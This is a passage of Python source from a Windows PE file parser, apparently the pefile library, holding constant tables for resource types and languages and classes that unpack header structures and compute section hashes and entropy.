    ("UNW_FLAG_EHANDLER", 0x01),
    ("UNW_FLAG_UHANDLER", 0x02),
    ("UNW_FLAG_CHAININFO", 0x04),
]

UNWIND_INFO_FLAGS = two_way_dict(unwind_info_flags)

registers = [
    ("RAX", 0),
    ("RCX", 1),
    ("RDX", 2),
    ("RBX", 3),
    ("RSP", 4),
    ("RBP", 5),
    ("RSI", 6),
    ("RDI", 7),
    ("R8", 8),
    ("R9", 9),
    ("R10", 10),
    ("R11", 11),
    ("R12", 12),
    ("R13", 13),
    ("R14", 14),
    ("R15", 15),
]

REGISTERS = two_way_dict(registers)

# enum _UNWIND_OP_CODES
UWOP_PUSH_NONVOL = 0
UWOP_ALLOC_LARGE = 1
UWOP_ALLOC_SMALL = 2
UWOP_SET_FPREG = 3
UWOP_SAVE_NONVOL = 4
UWOP_SAVE_NONVOL_FAR = 5
UWOP_EPILOG = 6
UWOP_SAVE_XMM128 = 8
UWOP_SAVE_XMM128_FAR = 9
UWOP_PUSH_MACHFRAME = 10


# Resource types
resource_type = [
    ("RT_CURSOR", 1),
    ("RT_BITMAP", 2),
    ("RT_ICON", 3),
    ("RT_MENU", 4),
    ("RT_DIALOG", 5),
    ("RT_STRING", 6),
    ("RT_FONTDIR", 7),
    ("RT_FONT", 8),
    ("RT_ACCELERATOR", 9),
    ("RT_RCDATA", 10),
    ("RT_MESSAGETABLE", 11),
    ("RT_GROUP_CURSOR", 12),
    ("RT_GROUP_ICON", 14),
    ("RT_VERSION", 16),
    ("RT_DLGINCLUDE", 17),
    ("RT_PLUGPLAY", 19),
    ("RT_VXD", 20),
    ("RT_ANICURSOR", 21),
    ("RT_ANIICON", 22),
    ("RT_HTML", 23),
    ("RT_MANIFEST", 24),
]

RESOURCE_TYPE = two_way_dict(resource_type)


# Language definitions
lang = [
    ("LANG_NEUTRAL", 0x00),
    ("LANG_INVARIANT", 0x7F),
    ("LANG_AFRIKAANS", 0x36),
    ("LANG_ALBANIAN", 0x1C),
    ("LANG_ARABIC", 0x01),
    ("LANG_ARMENIAN", 0x2B),
    ("LANG_ASSAMESE", 0x4D),
    ("LANG_AZERI", 0x2C),
    ("LANG_BASQUE", 0x2D),
    ("LANG_BELARUSIAN", 0x23),
    ("LANG_BENGALI", 0x45),
    ("LANG_BULGARIAN", 0x02),
    ("LANG_CATALAN", 0x03),
    ("LANG_CHINESE", 0x04),
    ("LANG_CROATIAN", 0x1A),
    ("LANG_CZECH", 0x05),
    ("LANG_DANISH", 0x06),
    ("LANG_DIVEHI", 0x65),
    ("LANG_DUTCH", 0x13),
    ("LANG_ENGLISH", 0x09),
    ("LANG_ESTONIAN", 0x25),
    ("LANG_FAEROESE", 0x38),
    ("LANG_FARSI", 0x29),
    ("LANG_FINNISH", 0x0B),
    ("LANG_FRENCH", 0x0C),
    ("LANG_GALICIAN", 0x56),
    ("LANG_GEORGIAN", 0x37),
    ("LANG_GERMAN", 0x07),
    ("LANG_GREEK", 0x08),
    ("LANG_GUJARATI", 0x47),
    ("LANG_HEBREW", 0x0D),
    ("LANG_HINDI", 0x39),
    ("LANG_HUNGARIAN", 0x0E),
    ("LANG_ICELANDIC", 0x0F),
    ("LANG_INDONESIAN", 0x21),
    ("LANG_ITALIAN", 0x10),
    ("LANG_JAPANESE", 0x11),
    ("LANG_KANNADA", 0x4B),
    ("LANG_KASHMIRI", 0x60),
    ("LANG_KAZAK", 0x3F),
    ("LANG_KONKANI", 0x57),
    ("LANG_KOREAN", 0x12),
    ("LANG_KYRGYZ", 0x40),
    ("LANG_LATVIAN", 0x26),
    ("LANG_LITHUANIAN", 0x27),
    ("LANG_MACEDONIAN", 0x2F),
    ("LANG_MALAY", 0x3E),
    ("LANG_MALAYALAM", 0x4C),
    ("LANG_MANIPURI", 0x58),
    ("LANG_MARATHI", 0x4E),
    ("LANG_MONGOLIAN", 0x50),
    ("LANG_NEPALI", 0x61),
    ("LANG_NORWEGIAN", 0x14),
    ("LANG_ORIYA", 0x48),
    ("LANG_POLISH", 0x15),
    ("LANG_PORTUGUESE", 0x16),
    ("LANG_PUNJABI", 0x46),
    ("LANG_ROMANIAN", 0x18),
    ("LANG_RUSSIAN", 0x19),
    ("LANG_SANSKRIT", 0x4F),
    ("LANG_SERBIAN", 0x1A),
    ("LANG_SINDHI", 0x59),
    ("LANG_SLOVAK", 0x1B),
    ("LANG_SLOVENIAN", 0x24),
    ("LANG_SPANISH", 0x0A),
    ("LANG_SWAHILI", 0x41),
    ("LANG_SWEDISH", 0x1D),
    ("LANG_SYRIAC", 0x5A),
    ("LANG_TAMIL", 0x49),
    ("LANG_TATAR", 0x44),
    ("LANG_TELUGU", 0x4A),
    ("LANG_THAI", 0x1E),
    ("LANG_TURKISH", 0x1F),
    ("LANG_UKRAINIAN", 0x22),
    ("LANG_URDU", 0x20),
    ("LANG_UZBEK", 0x43),
    ("LANG_VIETNAMESE", 0x2A),
    ("LANG_GAELIC", 0x3C),
    ("LANG_MALTESE", 0x3A),
    ("LANG_MAORI", 0x28),
    ("LANG_RHAETO_ROMANCE", 0x17),
    ("LANG_SAAMI", 0x3B),
    ("LANG_SORBIAN", 0x2E),
    ("LANG_SUTU", 0x30),
    ("LANG_TSONGA", 0x31),
    ("LANG_TSWANA", 0x32),
    ("LANG_VENDA", 0x33),
    ("LANG_XHOSA", 0x34),
    ("LANG_ZULU", 0x35),
    ("LANG_ESPERANTO", 0x8F),
    ("LANG_WALON", 0x90),
    ("LANG_CORNISH", 0x91),
    ("LANG_WELSH", 0x92),
    ("LANG_BRETON", 0x93),
]

LANG = two_way_dict(lang)


# Sublanguage definitions
sublang = [
    ("SUBLANG_NEUTRAL", 0x00),
    ("SUBLANG_DEFAULT", 0x01),
    ("SUBLANG_SYS_DEFAULT", 0x02),
    ("SUBLANG_ARABIC_SAUDI_ARABIA", 0x01),
    ("SUBLANG_ARABIC_IRAQ", 0x02),
    ("SUBLANG_ARABIC_EGYPT", 0x03),
    ("SUBLANG_ARABIC_LIBYA", 0x04),
    ("SUBLANG_ARABIC_ALGERIA", 0x05),
    ("SUBLANG_ARABIC_MOROCCO", 0x06),
    ("SUBLANG_ARABIC_TUNISIA", 0x07),
    ("SUBLANG_ARABIC_OMAN", 0x08),
    ("SUBLANG_ARABIC_YEMEN", 0x09),
    ("SUBLANG_ARABIC_SYRIA", 0x0A),
    ("SUBLANG_ARABIC_JORDAN", 0x0B),
    ("SUBLANG_ARABIC_LEBANON", 0x0C),
    ("SUBLANG_ARABIC_KUWAIT", 0x0D),
    ("SUBLANG_ARABIC_UAE", 0x0E),
    ("SUBLANG_ARABIC_BAHRAIN", 0x0F),
    ("SUBLANG_ARABIC_QATAR", 0x10),
    ("SUBLANG_AZERI_LATIN", 0x01),
    ("SUBLANG_AZERI_CYRILLIC", 0x02),
    ("SUBLANG_CHINESE_TRADITIONAL", 0x01),
    ("SUBLANG_CHINESE_SIMPLIFIED", 0x02),
    ("SUBLANG_CHINESE_HONGKONG", 0x03),
    ("SUBLANG_CHINESE_SINGAPORE", 0x04),
    ("SUBLANG_CHINESE_MACAU", 0x05),
    ("SUBLANG_DUTCH", 0x01),
    ("SUBLANG_DUTCH_BELGIAN", 0x02),
    ("SUBLANG_ENGLISH_US", 0x01),
    ("SUBLANG_ENGLISH_UK", 0x02),
    ("SUBLANG_ENGLISH_AUS", 0x03),
    ("SUBLANG_ENGLISH_CAN", 0x04),
    ("SUBLANG_ENGLISH_NZ", 0x05),
    ("SUBLANG_ENGLISH_EIRE", 0x06),
    ("SUBLANG_ENGLISH_SOUTH_AFRICA", 0x07),
    ("SUBLANG_ENGLISH_JAMAICA", 0x08),
    ("SUBLANG_ENGLISH_CARIBBEAN", 0x09),
    ("SUBLANG_ENGLISH_BELIZE", 0x0A),
    ("SUBLANG_ENGLISH_TRINIDAD", 0x0B),
    ("SUBLANG_ENGLISH_ZIMBABWE", 0x0C),
    ("SUBLANG_ENGLISH_PHILIPPINES", 0x0D),
    ("SUBLANG_FRENCH", 0x01),
    ("SUBLANG_FRENCH_BELGIAN", 0x02),
    ("SUBLANG_FRENCH_CANADIAN", 0x03),
    ("SUBLANG_FRENCH_SWISS", 0x04),
    ("SUBLANG_FRENCH_LUXEMBOURG", 0x05),
    ("SUBLANG_FRENCH_MONACO", 0x06),
    ("SUBLANG_GERMAN", 0x01),
    ("SUBLANG_GERMAN_SWISS", 0x02),
    ("SUBLANG_GERMAN_AUSTRIAN", 0x03),
    ("SUBLANG_GERMAN_LUXEMBOURG", 0x04),
    ("SUBLANG_GERMAN_LIECHTENSTEIN", 0x05),
    ("SUBLANG_ITALIAN", 0x01),
    ("SUBLANG_ITALIAN_SWISS", 0x02),
    ("SUBLANG_KASHMIRI_SASIA", 0x02),
    ("SUBLANG_KASHMIRI_INDIA", 0x02),
    ("SUBLANG_KOREAN", 0x01),
    ("SUBLANG_LITHUANIAN", 0x01),
    ("SUBLANG_MALAY_MALAYSIA", 0x01),
    ("SUBLANG_MALAY_BRUNEI_DARUSSALAM", 0x02),
    ("SUBLANG_NEPALI_INDIA", 0x02),
    ("SUBLANG_NORWEGIAN_BOKMAL", 0x01),
    ("SUBLANG_NORWEGIAN_NYNORSK", 0x02),
    ("SUBLANG_PORTUGUESE", 0x02),
    ("SUBLANG_PORTUGUESE_BRAZILIAN", 0x01),
    ("SUBLANG_SERBIAN_LATIN", 0x02),
    ("SUBLANG_SERBIAN_CYRILLIC", 0x03),
    ("SUBLANG_SPANISH", 0x01),
    ("SUBLANG_SPANISH_MEXICAN", 0x02),
    ("SUBLANG_SPANISH_MODERN", 0x03),
    ("SUBLANG_SPANISH_GUATEMALA", 0x04),
    ("SUBLANG_SPANISH_COSTA_RICA", 0x05),
    ("SUBLANG_SPANISH_PANAMA", 0x06),
    ("SUBLANG_SPANISH_DOMINICAN_REPUBLIC", 0x07),
    ("SUBLANG_SPANISH_VENEZUELA", 0x08),
    ("SUBLANG_SPANISH_COLOMBIA", 0x09),
    ("SUBLANG_SPANISH_PERU", 0x0A),
    ("SUBLANG_SPANISH_ARGENTINA", 0x0B),
    ("SUBLANG_SPANISH_ECUADOR", 0x0C),
    ("SUBLANG_SPANISH_CHILE", 0x0D),
    ("SUBLANG_SPANISH_URUGUAY", 0x0E),
    ("SUBLANG_SPANISH_PARAGUAY", 0x0F),
    ("SUBLANG_SPANISH_BOLIVIA", 0x10),
    ("SUBLANG_SPANISH_EL_SALVADOR", 0x11),
    ("SUBLANG_SPANISH_HONDURAS", 0x12),
    ("SUBLANG_SPANISH_NICARAGUA", 0x13),
    ("SUBLANG_SPANISH_PUERTO_RICO", 0x14),
    ("SUBLANG_SWEDISH", 0x01),
    ("SUBLANG_SWEDISH_FINLAND", 0x02),
    ("SUBLANG_URDU_PAKISTAN", 0x01),
    ("SUBLANG_URDU_INDIA", 0x02),
    ("SUBLANG_UZBEK_LATIN", 0x01),
    ("SUBLANG_UZBEK_CYRILLIC", 0x02),
    ("SUBLANG_DUTCH_SURINAM", 0x03),
    ("SUBLANG_ROMANIAN", 0x01),
    ("SUBLANG_ROMANIAN_MOLDAVIA", 0x02),
    ("SUBLANG_RUSSIAN", 0x01),
    ("SUBLANG_RUSSIAN_MOLDAVIA", 0x02),
    ("SUBLANG_CROATIAN", 0x01),
    ("SUBLANG_LITHUANIAN_CLASSIC", 0x02),
    ("SUBLANG_GAELIC", 0x01),
    ("SUBLANG_GAELIC_SCOTTISH", 0x02),
    ("SUBLANG_GAELIC_MANX", 0x03),
]

SUBLANG = two_way_dict(sublang)

# Initialize the dictionary with all the name->value pairs
SUBLANG = dict(sublang)
# Now add all the value->name information, handling duplicates appropriately
for sublang_name, sublang_value in sublang:
    if sublang_value in SUBLANG:
        SUBLANG[sublang_value].append(sublang_name)
    else:
        SUBLANG[sublang_value] = [sublang_name]

# Resolve a sublang name given the main lang name
#
def get_sublang_name_for_lang(lang_value, sublang_value):
    lang_name = LANG.get(lang_value, "*unknown*")
    for sublang_name in SUBLANG.get(sublang_value, []):
        # if the main language is a substring of sublang's name, then
        # return that
        if lang_name in sublang_name:
            return sublang_name
    # otherwise return the first sublang name
    return SUBLANG.get(sublang_value, ["*unknown*"])[0]


# Ange Albertini's code to process resources' strings
#
def parse_strings(data, counter, l):
    i = 0
    error_count = 0
    while i < len(data):

        data_slice = data[i : i + 2]
        if len(data_slice) < 2:
            break

        len_ = struct.unpack("<h", data_slice)[0]
        i += 2
        if len_ != 0 and 0 <= len_ * 2 <= len(data):
            try:
                l[counter] = b(data[i : i + len_ * 2]).decode("utf-16le")
            except UnicodeDecodeError:
                error_count += 1
                pass
            if error_count >= 3:
                break
            i += len_ * 2
        counter += 1


def retrieve_flags(flag_dict, flag_filter):
    """Read the flags from a dictionary and return them in a usable form.

    Will return a list of (flag, value) for all flags in "flag_dict"
    matching the filter "flag_filter".
    """

    return [
        (flag, flag_dict[flag])
        for flag in flag_dict.keys()
        if isinstance(flag, (str, bytes)) and flag.startswith(flag_filter)
    ]


def set_flags(obj, flag_field, flags):
    """Will process the flags and set attributes in the object accordingly.

    The object "obj" will gain attributes named after the flags provided in
    "flags" and valued True/False, matching the results of applying each
    flag value from "flags" to flag_field.
    """

    for flag, value in flags:
        if value & flag_field:
            obj.__dict__[flag] = True
        else:
            obj.__dict__[flag] = False


def power_of_two(val):
    return val != 0 and (val & (val - 1)) == 0


def b(x):
    if isinstance(x, bytes):
        return x
    elif isinstance(x, bytearray):
        return bytes(x)
    else:
        return codecs.encode(x, "cp1252")


class AddressSet(set):
    def __init__(self):
        super().__init__()
        self.min = None
        self.max = None

    def add(self, value):
        super().add(value)
        self.min = value if self.min is None else min(self.min, value)
        self.max = value if self.max is None else max(self.max, value)

    def diff(self):
        return 0 if self.min is None or self.max is None else self.max - self.min


class UnicodeStringWrapperPostProcessor:
    """This class attempts to help the process of identifying strings
    that might be plain Unicode or Pascal. A list of strings will be
    wrapped on it with the hope the overlappings will help make the
    decision about their type."""

    def __init__(self, pe, rva_ptr):
        self.pe = pe
        self.rva_ptr = rva_ptr
        self.string = None

    def get_rva(self):
        """Get the RVA of the string."""
        return self.rva_ptr

    def __str__(self):
        """Return the escaped UTF-8 representation of the string."""
        return self.decode("utf-8", "backslashreplace_")

    def decode(self, *args):
        if not self.string:
            return ""
        return self.string.decode(*args)

    def invalidate(self):
        """Make this instance None, to express it's no known string type."""
        self = None

    def render_pascal_16(self):
        try:
            self.string = self.pe.get_string_u_at_rva(
                self.rva_ptr + 2, max_length=self.get_pascal_16_length()
            )
        except PEFormatError:
            self.pe.get_warnings().append(
                "Failed rendering pascal string, "
                "attempting to read from RVA 0x{0:x}".format(self.rva_ptr + 2)
            )

    def get_pascal_16_length(self):
        return self.__get_word_value_at_rva(self.rva_ptr)

    def __get_word_value_at_rva(self, rva):
        try:
            data = self.pe.get_data(rva, 2)
        except PEFormatError:
            return False

        if len(data) < 2:
            return False

        return struct.unpack("<H", data)[0]

    def ask_unicode_16(self, next_rva_ptr):
        """The next RVA is taken to be the one immediately following this one.

        Such RVA could indicate the natural end of the string and will be checked
        to see if there's a Unicode NULL character there.
        """
        if self.__get_word_value_at_rva(next_rva_ptr - 2) == 0:
            self.length = next_rva_ptr - self.rva_ptr
            return True

        return False

    def render_unicode_16(self):
        try:
            self.string = self.pe.get_string_u_at_rva(self.rva_ptr)
        except PEFormatError:
            self.pe.get_warnings().append(
                "Failed rendering unicode string, "
                "attempting to read from RVA 0x{0:x}".format(self.rva_ptr)
            )


class PEFormatError(Exception):
    """Generic PE format error exception."""

    def __init__(self, value):
        self.value = value

    def __str__(self):
        return repr(self.value)


class Dump:
    """Convenience class for dumping the PE information."""

    def __init__(self):
        self.text = []

    def add_lines(self, txt, indent=0):
        """Adds a list of lines.

        The list can be indented with the optional argument 'indent'.
        """
        for line in txt:
            self.add_line(line, indent)

    def add_line(self, txt, indent=0):
        """Adds a line.

        The line can be indented with the optional argument 'indent'.
        """
        self.add(txt + "\n", indent)

    def add(self, txt, indent=0):
        """Adds some text, no newline will be appended.

        The text can be indented with the optional argument 'indent'.
        """
        self.text.append("{0}{1}".format(" " * indent, txt))

    def add_header(self, txt):
        """Adds a header element."""
        self.add_line("{0}{1}{0}\n".format("-" * 10, txt))

    def add_newline(self):
        """Adds a newline."""
        self.text.append("\n")

    def get_text(self):
        """Get the text in its current state."""
        return "".join("{0}".format(b) for b in self.text)


STRUCT_SIZEOF_TYPES = {
    "x": 1,
    "c": 1,
    "b": 1,
    "B": 1,
    "h": 2,
    "H": 2,
    "i": 4,
    "I": 4,
    "l": 4,
    "L": 4,
    "f": 4,
    "q": 8,
    "Q": 8,
    "d": 8,
    "s": 1,
}


@lru_cache(maxsize=2048)
def sizeof_type(t):
    count = 1
    _t = t
    if t[0] in string.digits:
        # extract the count
        count = int("".join([d for d in t if d in string.digits]))
        _t = "".join([d for d in t if d not in string.digits])
    return STRUCT_SIZEOF_TYPES[_t] * count


@lru_cache(maxsize=2048, copy=True)
def set_format(format):

    __format__ = "<"
    __unpacked_data_elms__ = []
    __field_offsets__ = {}
    __keys__ = []
    __format_length__ = 0

    offset = 0
    for elm in format:
        if "," in elm:
            elm_type, elm_name = elm.split(",", 1)
            __format__ += elm_type
            __unpacked_data_elms__.append(None)

            elm_names = elm_name.split(",")
            names = []
            for elm_name in elm_names:
                if elm_name in __keys__:
                    search_list = [x[: len(elm_name)] for x in __keys__]
                    occ_count = search_list.count(elm_name)
                    elm_name = "{0}_{1:d}".format(elm_name, occ_count)
                names.append(elm_name)
                __field_offsets__[elm_name] = offset

            offset += sizeof_type(elm_type)

            # Some PE header structures have unions on them, so a certain
            # value might have different names, so each key has a list of
            # all the possible members referring to the data.
            __keys__.append(names)

    __format_length__ = struct.calcsize(__format__)

    return (
        __format__,
        __unpacked_data_elms__,
        __field_offsets__,
        __keys__,
        __format_length__,
    )


class Structure:
    """Prepare structure object to extract members from data.

    Format is a list containing definitions for the elements
    of the structure.
    """

    def __init__(self, format, name=None, file_offset=None):
        # Format is forced little endian, for big endian non Intel platforms
        self.__format__ = "<"
        self.__keys__ = []
        self.__format_length__ = 0
        self.__field_offsets__ = {}
        self.__unpacked_data_elms__ = []

        d = format[1]
        # need a tuple to be hashable in set_format using lru cache
        if not isinstance(d, tuple):
            d = tuple(d)

        (
            self.__format__,
            self.__unpacked_data_elms__,
            self.__field_offsets__,
            self.__keys__,
            self.__format_length__,
        ) = set_format(d)

        self.__all_zeroes__ = False
        self.__file_offset__ = file_offset
        if name:
            self.name = name
        else:
            self.name = format[0]

    def __get_format__(self):
        return self.__format__

    def get_field_absolute_offset(self, field_name):
        """Return the offset within the field for the requested field in the structure."""
        return self.__file_offset__ + self.__field_offsets__[field_name]

    def get_field_relative_offset(self, field_name):
        """Return the offset within the structure for the requested field."""
        return self.__field_offsets__[field_name]

    def get_file_offset(self):
        return self.__file_offset__

    def set_file_offset(self, offset):
        self.__file_offset__ = offset

    def all_zeroes(self):
        """Returns true is the unpacked data is all zeros."""

        return self.__all_zeroes__

    def sizeof(self):
        """Return size of the structure."""

        return self.__format_length__

    def __unpack__(self, data):

        data = b(data)

        if len(data) > self.__format_length__:
            data = data[: self.__format_length__]

        # OC Patch:
        # Some malware have incorrect header lengths.
        # Fail gracefully if this occurs
        # Buggy malware: a29b0118af8b7408444df81701ad5a7f
        #
        elif len(data) < self.__format_length__:
            raise PEFormatError("Data length less than expected header length.")

        if count_zeroes(data) == len(data):
            self.__all_zeroes__ = True

        self.__unpacked_data_elms__ = struct.unpack(self.__format__, data)
        for idx, val in enumerate(self.__unpacked_data_elms__):
            for key in self.__keys__[idx]:
                setattr(self, key, val)

    def __pack__(self):

        new_values = []

        for idx, val in enumerate(self.__unpacked_data_elms__):

            for key in self.__keys__[idx]:
                new_val = getattr(self, key)

                # In the case of unions, when the first changed value
                # is picked the loop is exited
                if new_val != val:
                    break

            new_values.append(new_val)

        return struct.pack(self.__format__, *new_values)

    def __str__(self):
        return "\n".join(self.dump())

    def __repr__(self):
        return "<Structure: %s>" % (
            " ".join([" ".join(s.split()) for s in self.dump()])
        )

    def dump(self, indentation=0):
        """Returns a string representation of the structure."""

        dump = []

        dump.append("[{0}]".format(self.name))

        printable_bytes = [
            ord(i) for i in string.printable if i not in string.whitespace
        ]

        # Refer to the __set_format__ method for an explanation
        # of the following construct.
        for keys in self.__keys__:
            for key in keys:

                val = getattr(self, key)
                if isinstance(val, (int, long)):
                    if key.startswith("Signature_"):
                        val_str = "{:<8X}".format(val)
                    else:
                        val_str = "0x{:<8X}".format(val)
                    if key == "TimeDateStamp" or key == "dwTimeStamp":
                        try:
                            val_str += " [%s UTC]" % time.asctime(time.gmtime(val))
                        except ValueError:
                            val_str += " [INVALID TIME]"
                else:
                    val_str = bytearray(val)
                    if key.startswith("Signature"):
                        val_str = "".join(
                            ["{:02X}".format(i) for i in val_str.rstrip(b"\x00")]
                        )
                    else:
                        val_str = "".join(
                            [
                                chr(i)
                                if (i in printable_bytes)
                                else "\\x{0:02x}".format(i)
                                for i in val_str.rstrip(b"\x00")
                            ]
                        )

                dump.append(
                    "0x%-8X 0x%-3X %-30s %s"
                    % (
                        self.__field_offsets__[key] + self.__file_offset__,
                        self.__field_offsets__[key],
                        key + ":",
                        val_str,
                    )
                )

        return dump

    def dump_dict(self):
        """Returns a dictionary representation of the structure."""

        dump_dict = {}

        dump_dict["Structure"] = self.name

        # Refer to the __set_format__ method for an explanation
        # of the following construct.
        for keys in self.__keys__:
            for key in keys:

                val = getattr(self, key)
                if isinstance(val, (int, long)):
                    if key == "TimeDateStamp" or key == "dwTimeStamp":
                        try:
                            val = "0x%-8X [%s UTC]" % (
                                val,
                                time.asctime(time.gmtime(val)),
                            )
                        except ValueError:
                            val = "0x%-8X [INVALID TIME]" % val
                else:
                    val = "".join(
                        chr(d) if chr(d) in string.printable else "\\x%02x" % d
                        for d in [ord(c) if not isinstance(c, int) else c for c in val]
                    )

                dump_dict[key] = {
                    "FileOffset": self.__field_offsets__[key] + self.__file_offset__,
                    "Offset": self.__field_offsets__[key],
                    "Value": val,
                }

        return dump_dict


class SectionStructure(Structure):
    """Convenience section handling class."""

    def __init__(self, *argl, **argd):
        if "pe" in argd:
            self.pe = argd["pe"]
            del argd["pe"]

        Structure.__init__(self, *argl, **argd)
        self.PointerToRawData_adj = None
        self.VirtualAddress_adj = None
        self.section_min_addr = None
        self.section_max_addr = None

    def get_PointerToRawData_adj(self):
        if self.PointerToRawData_adj is None:
            if self.PointerToRawData is not None:
                self.PointerToRawData_adj = self.pe.adjust_FileAlignment(
                    self.PointerToRawData, self.pe.OPTIONAL_HEADER.FileAlignment
                )
        return self.PointerToRawData_adj

    def get_VirtualAddress_adj(self):
        if self.VirtualAddress_adj is None:
            if self.VirtualAddress is not None:
                self.VirtualAddress_adj = self.pe.adjust_SectionAlignment(
                    self.VirtualAddress,
                    self.pe.OPTIONAL_HEADER.SectionAlignment,
                    self.pe.OPTIONAL_HEADER.FileAlignment,
                )
        return self.VirtualAddress_adj

    def get_data(self, start=None, length=None, ignore_padding=False):
        """Get data chunk from a section.

        Allows to query data from the section by passing the
        addresses where the PE file would be loaded by default.
        It is then possible to retrieve code and data by their real
        addresses as they would be if loaded.

        Note that sections on disk can include padding that would
        not be loaded to memory. That is the case if `section.SizeOfRawData`
        is greater than `section.Misc_VirtualSize`, and that means
        that data past `section.Misc_VirtualSize` is padding.
        In case you are not interested in this padding, passing
        `ignore_padding=True` will truncate the result in order
        not to return the padding (if any).

        Returns bytes() under Python 3.x and set() under Python 2.7
        """

        if start is None:
            offset = self.get_PointerToRawData_adj()
        else:
            offset = (
                start - self.get_VirtualAddress_adj()
            ) + self.get_PointerToRawData_adj()

        if length is not None:
            end = offset + length
        else:
            end = offset + self.SizeOfRawData

        if ignore_padding:
            end = min(end, offset + self.Misc_VirtualSize)

        # PointerToRawData is not adjusted here as we might want to read any possible
        # extra bytes that might get cut off by aligning the start (and hence cutting
        # something off the end)
        if end > self.PointerToRawData + self.SizeOfRawData:
            end = self.PointerToRawData + self.SizeOfRawData
        return self.pe.__data__[offset:end]

    def __setattr__(self, name, val):

        if name == "Characteristics":
            section_flags = retrieve_flags(SECTION_CHARACTERISTICS, "IMAGE_SCN_")

            # Set the section's flags according to the Characteristics member
            set_flags(self, val, section_flags)

        elif "IMAGE_SCN_" in name and hasattr(self, name):
            if val:
                self.__dict__["Characteristics"] |= SECTION_CHARACTERISTICS[name]
            else:
                self.__dict__["Characteristics"] ^= SECTION_CHARACTERISTICS[name]

        self.__dict__[name] = val

    def get_rva_from_offset(self, offset):
        return offset - self.get_PointerToRawData_adj() + self.get_VirtualAddress_adj()

    def get_offset_from_rva(self, rva):
        return rva - self.get_VirtualAddress_adj() + self.get_PointerToRawData_adj()

    def contains_offset(self, offset):
        """Check whether the section contains the file offset provided."""

        if self.PointerToRawData is None:
            # bss and other sections containing only uninitialized data must have 0
            # and do not take space in the file
            return False
        PointerToRawData_adj = self.get_PointerToRawData_adj()
        return (
            PointerToRawData_adj <= offset < PointerToRawData_adj + self.SizeOfRawData
        )

    def contains_rva(self, rva):
        """Check whether the section contains the address provided."""

        # speedup
        if self.section_min_addr is not None and self.section_max_addr is not None:
            return self.section_min_addr <= rva < self.section_max_addr

        VirtualAddress_adj = self.get_VirtualAddress_adj()
        # Check if the SizeOfRawData is realistic. If it's bigger than the size of
        # the whole PE file minus the start address of the section it could be
        # either truncated or the SizeOfRawData contains a misleading value.
        # In either of those cases we take the VirtualSize
        #
        if len(self.pe.__data__) - self.get_PointerToRawData_adj() < self.SizeOfRawData:
            # PECOFF documentation v8 says:
            # VirtualSize: The total size of the section when loaded into memory.
            # If this value is greater than SizeOfRawData, the section is zero-padded.
            # This field is valid only for executable images and should be set to zero
            # for object files.
            #
            size = self.Misc_VirtualSize
        else:
            size = max(self.SizeOfRawData, self.Misc_VirtualSize)

        # Check whether there's any section after the current one that starts before
        # the calculated end for the current one. If so, cut the current section's size
        # to fit in the range up to where the next section starts.
        if (
            self.next_section_virtual_address is not None
            and self.next_section_virtual_address > self.VirtualAddress
            and VirtualAddress_adj + size > self.next_section_virtual_address
        ):
            size = self.next_section_virtual_address - VirtualAddress_adj

        self.section_min_addr = VirtualAddress_adj
        self.section_max_addr = VirtualAddress_adj + size
        return VirtualAddress_adj <= rva < VirtualAddress_adj + size

    def contains(self, rva):
        return self.contains_rva(rva)

    def get_entropy(self):
        """Calculate and return the entropy for the section."""

        return self.entropy_H(self.get_data())

    def get_hash_sha1(self):
        """Get the SHA-1 hex-digest of the section's data."""

        if sha1 is not None:
            return sha1(self.get_data()).hexdigest()

    def get_hash_sha256(self):
        """Get the SHA-256 hex-digest of the section's data."""

        if sha256 is not None:
            return sha256(self.get_data()).hexdigest()

    def get_hash_sha512(self):
        """Get the SHA-512 hex-digest of the section's data."""

        if sha512 is not None:
            return sha512(self.get_data()).hexdigest()

    def get_hash_md5(self):
        """Get the MD5 hex-digest of the section's data."""

        if md5 is not None:
            return md5(self.get_data()).hexdigest()

    def entropy_H(self, data):
        """Calculate the entropy of a chunk of data."""

        if not data:
            return 0.0

        occurences = Counter(bytearray(data))

        entropy = 0
        for x in occurences.values():
            p_x = float(x) / len(data)
            entropy -= p_x * math.log(p_x, 2)

        return entropy


@lru_cache(maxsize=2048, copy=False)
def set_bitfields_format(format):
    class Accumulator:
        def __init__(self, fmt, comp_fields):
            self._subfields = []
            # add a prefix to distinguish the artificially created compoud field
            # from regular fields
            self._name = "~"
            self._type = None
            self._bits_left = 0
            self._comp_fields = comp_fields
            self._format = fmt

        def wrap_up(self):
            if self._type is None:
                return
            self._format.append(self._type + "," + self._name)
            self._comp_fields[len(self._format) - 1] = (self._type, self._subfields)
            self._name = "~"
            self._type = None
            self._subfields = []

        def new_type(self, tp):
            self._bits_left = STRUCT_SIZEOF_TYPES[tp] * 8
            self._type = tp

        def add_subfield(self, name, bitcnt):
            self._name += name
            self._bits_left -= bitcnt
            self._subfields.append((name, bitcnt))

        def get_type(self):
            return self._type

        def get_name(self):
            return self._name

        def get_bits_left(self):
            return self._bits_left

    old_fmt = []
    comp_fields = {}
    ac = Accumulator(old_fmt, comp_fields)

    for elm in format[1]:
        if not ":" in elm:
            ac.wrap_up()
            old_fmt.append(elm)
            continue

        elm_type, elm_name = elm.split(",", 1)

        if "," in elm_name:
            raise NotImplementedError(
                "Structures with bitfields do not support unions yet"
            )

        elm_type, elm_bits = elm_type.split(":", 1)
        elm_bits = int(elm_bits)
        if elm_type != ac.get_type() or elm_bits > ac.get_bits_left():
            ac.wrap_up()
            ac.new_type(elm_type)

        ac.add_subfield(elm_name, elm_bits)
    ac.wrap_up()

    format_str, _, field_offsets, keys, format_length = set_format(tuple(old_fmt))

    extended_keys = []
    for idx, val in enumerate(keys):
        if not idx in comp_fields:
            extended_keys.append(val)
            continue
        _, sbf = comp_fields[idx]
        bf_names = [[f[StructureWithBitfields.BTF_NAME_IDX]] for f in sbf]
        extended_keys.extend(bf_names)
        for n in bf_names:
            field_offsets[n[0]] = field_offsets[val[0]]

    return (format_str, format_length, field_offsets, keys, extended_keys, comp_fields)


class StructureWithBitfields(Structure):
    """
    Extends Structure's functionality with support for bitfields such as:
        ('B:4,LowerHalf', 'B:4,UpperHalf')
    To this end, two lists are maintained:
        * self.__keys__ that contains compound fields, for example
          ('B,~LowerHalfUpperHalf'), and is used during packing/unpaking
        * self.__keys_ext__ containing a separate key for each field (ex., LowerHalf,
          UpperHalf) to simplify implementation of dump()
    This way the implementation of unpacking/packing and dump() from Structure can be
    reused.

    In addition, we create a dictionary:
        <comound_field_index_in_keys> -->
            (data type, [ (subfield name, length in bits)+ ] )
    that facilitates bitfield paking and unpacking.

    With lru_cache() creating only once instance per format string, the memory
    overhead is negligible.
